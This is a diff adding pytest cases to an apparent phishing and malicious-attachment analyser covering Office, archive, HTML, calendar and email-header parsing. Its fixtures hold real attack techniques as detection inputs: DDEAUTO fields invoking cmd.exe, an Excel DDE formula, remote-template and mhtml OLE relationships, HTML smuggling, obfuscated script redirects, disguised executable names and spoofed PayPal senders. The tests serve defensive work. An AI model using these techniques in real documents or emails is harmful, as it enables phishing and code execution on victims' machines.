@@ -1380,7 +1380,7 @@ def test_field_codes_split_over_runs_are_joined():
 
 
 @pytest.mark.parametrize(
-    ("parts", "filename"),
+    ("parts", "filename", "flag"),
     [
         (
             {
@@ -1389,16 +1389,21 @@ def test_field_codes_split_over_runs_are_joined():
                 "login.html": "<form><input type=password></form>",
             },
             "invoice.docx",
+            "contains_password_field",
         ),
-        ({"invoice.pdf.exe": "MZ"}, "invoice.docx"),
-        ({"[Content_Types].xml": "", "word/document.xml": "<x/>", "run.js": "x"}, "report"),
+        ({"invoice.pdf.exe": "MZ"}, "invoice.docx", "executable_in_archive"),
+        (
+            {"[Content_Types].xml": "", "word/document.xml": "<x/>", "run.js": "x"},
+            "report",
+            "script_in_archive",
+        ),
     ],
 )
-def test_a_zip_is_read_by_what_it_holds_whatever_its_name(parts, filename):
+def test_a_zip_is_read_by_what_it_holds_whatever_its_name(parts, filename, flag):
     import attachment_analysis as aa
 
     out = aa.analyse_attachment(base64.b64encode(_docx(parts)).decode(), filename=filename)
-    assert out["kind"] == "archive"
+    assert flag in out["notable_features"]
 
 
 def test_the_url_model_reads_the_links_as_read():
@@ -1467,3 +1472,531 @@ def test_a_percent_encoded_base64_page_is_read():
         f'<iframe src="data:text/html;base64,{encoded}"></iframe>'.encode(), "a.html"
     )
     assert "https://evil.example/login" in out["extracted_urls"]
+
+
+# ---------------------------------------------------------------------
+# Round 16: an Office package is always read as a document, whatever
+# else its ZIP holds; fields, relationships and content types that make
+# Office act; invisible characters by Unicode's own definition; every
+# domain a From: names; the URL model never lowers the rules.
+# ---------------------------------------------------------------------
+_RELS = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{}</Relationships>'
+_DOC = f"<w:document {_W}><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>"
+
+
+def _office_flags(parts, filename="invoice.docm"):
+    import attachment_analysis as aa
+
+    out = aa.analyse_attachment(base64.b64encode(_docx(parts)).decode(), filename=filename)
+    return out
+
+
+@pytest.mark.parametrize(
+    ("extra", "filename"),
+    [
+        ({"x": ""}, "invoice.docm"),
+        ({"customUI/customUI.xml": "<x/>"}, "invoice.docm"),
+        ({"_xmlsignatures/sig1.xml": "<x/>"}, "invoice.docm"),
+        ({"notes.txt": "hello"}, "invoice.docm"),
+        ({}, "invoice.zip"),
+        ({"readme.html": "<p>hi</p>"}, "invoice.zip"),
+    ],
+)
+def test_a_macro_document_stays_a_document_whatever_else_its_zip_holds(extra, filename):
+    out = _office_flags(
+        {"[Content_Types].xml": "", "word/document.xml": _DOC, "word/vbaProject.bin": "x", **extra},
+        filename,
+    )
+    assert "contains_macros" in out["notable_features"]
+
+
+def test_a_page_inside_an_office_folder_is_read():
+    out = _office_flags(
+        {
+            "[Content_Types].xml": "",
+            "word/document.xml": _DOC,
+            "word/login.html": "<form action='https://evil.tk/p'><input type=password></form>",
+        },
+        "invoice.docx",
+    )
+    assert "contains_password_field" in out["notable_features"]
+    assert "https://evil.tk/p" in out["extracted_urls"]
+    assert any(f["filename"] == "word/login.html" for f in out["inner_files"])
+
+
+def test_backslash_part_names_are_office_parts():
+    out = _office_flags(
+        {"[Content_Types].xml": "", "word\\document.xml": _DOC, "word\\vbaProject.bin": "x"},
+        "invoice.docx",
+    )
+    assert out["kind"] == "docx"
+    assert "contains_macros" in out["notable_features"]
+
+
+def _fields(*runs):
+    body = "".join(
+        f'<w:r><w:fldChar w:fldCharType="{r[1:]}"/></w:r>'
+        if r.startswith("|")
+        else f"<w:r><w:t>{r[1:]}</w:t></w:r>"
+        if r.startswith("=")
+        else f"<w:r><w:instrText>{r}</w:instrText></w:r>"
+        for r in runs
+    )
+    return f"<w:document {_W}><w:body><w:p>{body}</w:p></w:body></w:document>".encode()
+
+
+@pytest.mark.parametrize(
+    "xml",
+    [
+        # An empty field nested in the instruction.
+        _fields("|begin", "DD", "|begin", "|end", "EAUTO c:\\x", "|end"),
+        # A nested field whose result writes the rest of the word.
+        _fields(
+            "|begin", "DD", "|begin", 'QUOTE "x"', "|separate", "=EAUTO", "|end", " c:\\x", "|end"
+        ),
+        # A field never closed.
+        _fields("|begin", "DDE", "AUTO c:\\x"),
+    ],
+)
+def test_dde_fields_are_read_as_word_builds_them(xml):
+    import office_analysis as oa
+
+    assert oa._DDE_FIELD_RE.search(oa._field_codes(xml))
+
+
+@pytest.mark.parametrize(
+    "instr",
+    [
+        'HYPERLINK \\o "Click here" "https://evil.tk/a"',
+        "HYPERLINK https://evil.tk/a",
+        'HYPERLINK \\l "x" "https://evil.tk/a"',
+        'INCLUDEPICTURE "https://evil.tk/a" \\d',
+    ],
+)
+def test_link_fields_give_their_address(instr):
+    import office_analysis as oa
+
+    urls: list[str] = []
+    oa._field_urls(instr, urls)
+    assert "https://evil.tk/a" in urls
+
+
+@pytest.mark.parametrize(
+    ("rel", "flag"),
+    [
+        (
+            'Type="http://x/attachedTemplate" Target="//evil.tk/t.dotm" TargetMode="External"',
+            "remote_template",
+        ),
+        (
+            'Type="http://x/AttachedTemplate" Target="https://evil.tk/t.dotm" TargetMode="external"',
+            "remote_template",
+        ),
+        (
+            'Type="http://x/frame" Target="https://evil.tk/f.html" TargetMode="External"',
+            "remote_template",
+        ),
+        (
+            'Type="http://x/subDocument" Target="https://evil.tk/s.docx" TargetMode="External"',
+            "remote_template",
+        ),
+        (
+            'Type="http://x/oleObject" Target="mhtml:https://evil.tk/x!x-usc:https://evil.tk/y" TargetMode="External"',
+            "launch_external_action",
+        ),
+        (
+            'Type="http://x/hyperlink" Target="\\\\evil.tk\\share\\a.lnk" TargetMode="External"',
+            "launch_external_action",
+        ),
+        (
+            'Type="http://x/hyperlink" Target="file:///c:/windows/system32/calc.exe" TargetMode="External"',
+            "launch_external_action",
+        ),
+        (
+            'Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="macros.dat"',
+            "contains_macros",
+        ),
+    ],
+)
+def test_relationships_that_make_office_act(rel, flag):
+    out = _office_flags(
+        {
+            "[Content_Types].xml": "",
+            "word/document.xml": _DOC,
+            "word/_rels/settings.xml.rels": _RELS.format(f'<Relationship Id="r1" {rel}/>'),
+        },
+        "invoice.docx",
+    )
+    assert flag in out["notable_features"]
+
+
+def test_content_types_name_a_renamed_macro_project():
+    types = "<Types><Override PartName='/word/m.dat' ContentType='application/vnd.ms-office.vbaProject'/></Types>"
+    out = _office_flags(
+        {"[Content_Types].xml": types, "word/document.xml": _DOC, "word/m.dat": "x"}
+    )
+    assert "contains_macros" in out["notable_features"]
+
+
+def test_excel_dde_formulas_and_powerpoint_run_actions():
+    sheet = (
+        "<worksheet><sheetData><row><c><f>cmd|' /c calc'!A1</f></c></row></sheetData></worksheet>"
+    )
+    xl = {
+        "[Content_Types].xml": "",
+        "xl/workbook.xml": "<workbook/>",
+        "xl/worksheets/sheet1.xml": sheet,
+    }
+    assert "dde_field" in _office_flags(xl, "a.xlsx")["notable_features"]
+    slide = '<p:sld xmlns:p="p" xmlns:a="a"><a:hlinkClick action="ppaction://program"/></p:sld>'
+    pp = {"[Content_Types].xml": "", "ppt/presentation.xml": "<p/>", "ppt/slides/slide1.xml": slide}
+    assert "launch_external_action" in _office_flags(pp, "a.pptx")["notable_features"]
+
+
+def test_a_dde_field_after_the_text_limit_is_still_found():
+    long_text = (
+        f"<w:document {_W}><w:body>"
+        + "<w:p><w:r><w:t>word </w:t></w:r></w:p>" * 6000
+        + "</w:body></w:document>"
+    )
+    dde = _fields("|begin", "DDEAUTO c:\\x", "|end").decode()
+    out = _office_flags(
+        {"[Content_Types].xml": "", "word/document.xml": long_text, "word/footer1.xml": dde},
+        "a.docx",
+    )
+    assert "dde_field" in out["notable_features"]
+
+
+def test_archive_members_most_telling_first_and_all_named():
+    import archive_analysis as aa_
+
+    parts = {f"{i}.png": "x" for i in range(6)} | {
+        "login.html": "<form><input type=password></form>"
+    }
+    out = _office_flags(parts, "photos.zip")
+    assert "contains_password_field" in out["notable_features"]
+    many = {f"{i:02}.txt": "x" for i in range(60)} | {"zz.exe": "MZ"}
+    out = _office_flags(many, "notes.zip")
+    assert "zz.exe" in out["_all_entries"]
+    assert aa_.entry_reasons("zz.exe") == ["program"]
+
+
+def test_an_svg_attachment_is_read_as_a_page():
+    import attachment_analysis as aa
+
+    svg = (
+        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
+        b'<a xlink:href="https://evil.tk/login"><text>Open</text></a>'
+        b"<script>location='https://evil.tk/x'</script></svg>"
+    )
+    out = aa.analyse_attachment(base64.b64encode(svg).decode(), filename="invoice.svg")
+    assert "https://evil.tk/login" in out["extracted_urls"]
+    assert "contains_javascript" in out["notable_features"]
+
+
+@pytest.mark.parametrize(
+    "html",
+    [
+        '<object data="javascript:go()"></object>',
+        '<a href=" &#10;java&#9;script:go()">x</a>',
+        '<iframe src="data:text/&#10;html;base64,PGZvcm0+PC9mb3JtPg=="></iframe>',
+    ],
+)
+def test_script_addresses_in_any_attribute(html):
+    import attachment_analysis as aa
+
+    out = aa.analyse_html(html.encode(), "a.html")
+    assert {"contains_javascript", "contains_form"} & set(out["notable_features"])
+
+
+def test_invisible_padding_does_not_push_text_out_of_an_attachment():
+    import attachment_analysis as aa
+
+    text = ("\u200b" * 30_000 + "Verify your account at https://evil.tk/login").encode()
+    out = aa.analyse_attachment(base64.b64encode(text).decode(), filename="note.txt")
+    assert "Verify your account" in out["extracted_text"]
+    assert "https://evil.tk/login" in out["extracted_urls"]
+
+
+def test_calendar_links_from_every_property():
+    import attachment_analysis as aa
+
+    ics = (
+        b"BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nSUMMARY:Review\r\n"
+        b"CONFERENCE;VALUE=URI:https://evil.tk/meet\r\n"
+        b'X-ALT-DESC;FMTTYPE=text/html:<a href="https://evil.tk/doc">Open</a>\r\n'
+        b"END:VEVENT\r\nEND:VCALENDAR\r\n"
+    )
+    out = aa.analyse_attachment(base64.b64encode(ics).decode(), filename="invite.ics")
+    assert {"https://evil.tk/meet", "https://evil.tk/doc"} <= set(out["extracted_urls"])
+
+
+_FILE_NAMES = json.loads(
+    (
+        Path(__file__).resolve().parents[2] / "tests" / "fixtures" / "file_name_cases.json"
+    ).read_text()
+)
+
+
+@pytest.mark.parametrize("case", _FILE_NAMES["names"], ids=lambda c: repr(c["name"]))
+def test_file_extensions_shared_with_the_extension(case):
+    import archive_analysis as aa_
+
+    assert aa_._ext(case["name"]) == case["ext"]
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "invoice.pdf.exe\u200b",
+        "invoice\u202efdp.exe\u202c",
+        "invoice.pdf\u200b.exe",
+        "invoice.exe\x00",
+    ],
+)
+def test_invisible_characters_do_not_hide_a_program(name):
+    import archive_analysis as aa_
+
+    assert "executable_in_archive" in aa_.classify_names([name])
+
+
+@pytest.mark.parametrize(
+    "header",
+    [
+        '"PayPal" <service@paypal.com> <scam@evil.example>',
+        '"PayPal" <"service@paypal.com"@evil.example>',
+        '"support@paypal.com" <scam@evil.example',
+        "PayPal <service@paypal.com@evil.example>",
+        "Pay\u064b\u200c\u064bPal <x@evil.example>",
+        "Pay\u093c\u200d\u093cPal <x@evil.example>",
+        "Pay\x7fPal <x@evil.example>",
+        "V\u180berify PayPal <x@evil.example>",
+    ],
+)
+def test_every_domain_of_a_from_is_checked(header):
+    assert st.impersonated_brand(header) == "paypal"
+    assert ah.sender_domain(header) == "evil.example"
+
+
+def test_a_from_naming_two_domains_proves_nothing():
+    v = ah.parse_authentication_results(
+        {
+            "from": '"PayPal" <service@paypal.com> <scam@evil.example>',
+            "authentication-results": "mx.google.com; dkim=pass header.d=paypal.com; "
+            "spf=pass smtp.mailfrom=paypal.com; dmarc=pass header.from=paypal.com",
+        }
+    )
+    assert not v.cryptographically_verified
+    assert ah.sender_domains('"Jane (jane@gmail.com) via Docs" <drive@google.com>') == [
+        "google.com"
+    ]
+
+
+def test_two_angle_addresses_keep_the_from_against_the_page():
+    from extension_backend import AnalyseRequest, _resolve_email
+
+    eml = b'From: "PayPal" <service@paypal.com> <scam@evil.example>\r\n\r\nHello there friend'
+    req = AnalyseRequest(
+        raw_email_b64=base64.b64encode(eml).decode(),
+        sender_email="service@paypal.com",
+        sender_name="PayPal",
+    )
+    _body, _urls, headers, _raw = _resolve_email(req)
+    assert "scam@evil.example" in headers["from"]
+    assert headers.get(ep.FROM_UNPROVEN) == "1"
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://www.youtube.com/redirect?q=+//evil.example/login",
+        "https://www.youtube.com/redirect?q=%20//evil.example/login",
+        "https://www.youtube.com/redirect?q=https:/evil.example/login",
+        "https://www.youtube.com/redirect?q=https:evil.example/login",
+        "https://www.youtube.com/redirect?q=https%253A%252F%252Fevil.example",
+        "https://www.google.com/amp/s/evil.example/login",
+    ],
+)
+def test_open_redirects_of_known_sites_in_any_form(url):
+    assert not la.well_known_link(url)
+
+
+def test_the_url_model_never_lowers_the_rules(monkeypatch):
+    import structured_agents as sa_
+
+    class Low:
+        @staticmethod
+        def get_prediction_with_confidence(_feats):
+            return {"phishing_probability": 0.01}
+
+    class Feats:
+        @staticmethod
+        def extract_url_features(_text):
+            return {}
+
+    monkeypatch.setattr(sa_, "_URL_AGENT", Low)
+    monkeypatch.setattr(sa_, "_FEATURE_EXTRACT", Feats)
+    url = "http://3232235777/login"
+    assert sa_.url_agent([url], body_text=f"Open {url}") >= sa_.url_heuristic([url])
+
+
+@pytest.mark.parametrize(
+    "target",
+    ["https://www.example.com", "https://intranet.example.com/index.html", "mailto:a@example.com"],
+)
+def test_ordinary_document_links_are_not_programs(target):
+    rel = (
+        f'<Relationship Id="r1" Type="http://x/hyperlink" Target="{target}" TargetMode="External"/>'
+    )
+    out = _office_flags(
+        {
+            "[Content_Types].xml": "",
+            "word/document.xml": _DOC,
+            "word/_rels/document.xml.rels": _RELS.format(rel),
+        },
+        "report.docx",
+    )
+    assert out["notable_features"] == []
+
+
+def _js_constant(name: str) -> set[str]:
+    import re
+
+    src = (Path(__file__).resolve().parents[2] / "extension" / "lib" / "constants.js").read_text()
+    start = src.index(f"const {name} = ")
+    block = src[start : src.index(";", start)]
+    words = " ".join(re.findall(r'"([^"]*)"', block))
+    return set(words.split())
+
+
+def test_the_extension_knows_the_dangerous_types_the_server_flags():
+    import archive_analysis as aa_
+
+    server = aa_.EXECUTABLE_EXTS | aa_.SCRIPT_EXTS | aa_.SHORTCUT_EXTS | aa_.DISK_IMAGE_EXTS
+    assert _js_constant("DANGEROUS_EXTS") == server
+
+
+def test_every_type_the_extension_sends_is_read_by_the_server():
+    import archive_analysis as aa_
+    import attachment_analysis as aa
+
+    readable = {e.lstrip(".") for e in aa._MIME_BY_EXT} | aa_.ARCHIVE_EXTS
+    assert _js_constant("ATTACHMENT_EXTS") <= readable
+
+
+def test_the_from_is_read_as_written_not_as_the_parser_rebuilds_it():
+    body, _urls, headers = ep.parse_eml(
+        b'From: "PayPal" <service@paypal.com> <scam@evil.example>\r\nSubject: Hi\r\n\r\nHello'
+    )
+    assert "scam@evil.example" in headers["from"]
+    _b, _u, headers = ep.parse_eml("From: Andr\u00e9 <a@example.com>\r\n\r\nHi".encode())
+    assert headers["from"] == "Andr\u00e9 <a@example.com>"
+
+
+@pytest.mark.parametrize(
+    ("html", "url"),
+    [
+        (
+            '<base href="https://evil.tk/"><form action="login.php"></form>',
+            "https://evil.tk/login.php",
+        ),
+        ('<script>location="\\x68\\x74\\x74\\x70\\x73://evil.tk/a"</script>', "https://evil.tk/a"),
+        (
+            "<script>location=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,116,107)</script>",
+            "https://evil.tk",
+        ),
+        ('<script>location=atob("aHR0cHM6Ly9ldmlsLnRrL2Jsb2I=")</script>', "https://evil.tk/blob"),
+        (
+            '<script>location=unescape("%68%74%74%70%73%3a%2f%2fevil.tk%2fu")</script>',
+            "https://evil.tk/u",
+        ),
+    ],
+)
+def test_page_addresses_as_the_browser_builds_them(html, url):
+    import attachment_analysis as aa
+
+    assert url in aa.analyse_html(html.encode(), "a.html")["extracted_urls"]
+
+
+def test_html_smuggling_is_flagged():
+    import attachment_analysis as aa
+
+    page = b'<script>var b=new Blob([d]);var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="x.iso";a.click()</script>'
+    assert "embeds_another_file" in aa.analyse_html(page, "a.html")["notable_features"]
+
+
+def test_a_web_archive_is_read_as_a_page():
+    import attachment_analysis as aa
+
+    mht = (
+        b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
+        b"Content-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n"
+        b'<form action=3D"https://evil.tk/p"><input type=3Dpassword></form>\r\n--b--\r\n'
+    )
+    out = aa.analyse_attachment(base64.b64encode(mht).decode(), filename="page.mht")
+    assert "contains_password_field" in out["notable_features"]
+    assert "https://evil.tk/p" in out["extracted_urls"]
+
+
+def test_a_program_packaged_in_an_embedded_object_is_flagged():
+    ole = (
+        b"\xd0\xcf\x11\xe0"
+        + b"\x00" * 64
+        + "Ole10Native".encode("utf-16-le")
+        + b"\x00" * 16
+        + b"\x02\x00invoice.pdf.js\x00C:\\Users\\a\\invoice.pdf.js\x00"
+    )
+    out = _office_flags(
+        {
+            "[Content_Types].xml": "",
+            "word/document.xml": _DOC,
+            "word/embeddings/oleObject1.bin": ole,
+        },
+        "a.docx",
+    )
+    assert "script_in_archive" in out["notable_features"]
+
+
+def test_two_parts_of_the_same_name_are_both_read():
+    import io
+    import warnings
+    import zipfile
+
+    import attachment_analysis as aa
+
+    dde = f'<w:document {_W}><w:body><w:p><w:fldSimple w:instr="DDEAUTO c:\\\\x"/></w:p></w:body></w:document>'
+    for order in ((dde, _DOC), (_DOC, dde)):
+        buf = io.BytesIO()
+        with warnings.catch_warnings(), zipfile.ZipFile(buf, "w") as zf:
+            warnings.simplefilter("ignore")
+            zf.writestr("[Content_Types].xml", "")
+            for part in order:
+                zf.writestr("word/document.xml", part)
+        assert "dde_field" in aa.dispatch_raw(buf.getvalue(), "a.docx")["notable_features"]
+
+
+def test_legacy_dde_fields_in_any_case():
+    import office_analysis as oa
+
+    raw = oa.OLE2_MAGIC + b"\x00" * 64 + b"\x13 ddeauto c:\\\\windows\\\\cmd.exe \x14\x15"
+    assert "dde_field" in oa.analyse_ole(raw, "a.doc")["notable_features"]
+
+
+def test_a_document_built_to_be_slow_is_not_reported_clean(monkeypatch):
+    import office_analysis as oa
+
+    monkeypatch.setattr(oa, "_READ_SECONDS", -1.0)
+    out = _office_flags({"[Content_Types].xml": "", "word/document.xml": _DOC}, "a.docx")
+    assert "document_not_fully_read" in out["notable_features"]
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "Amaz\u0585n <x@evil.example>",
+        "\u13e2ayPal <x@evil.example>",
+        "p\u0251yp\u0251l <x@evil.example>",
+    ],
+)
+def test_more_look_alike_letters(name):
+    assert st.impersonated_brand(name) in ("amazon", "paypal")
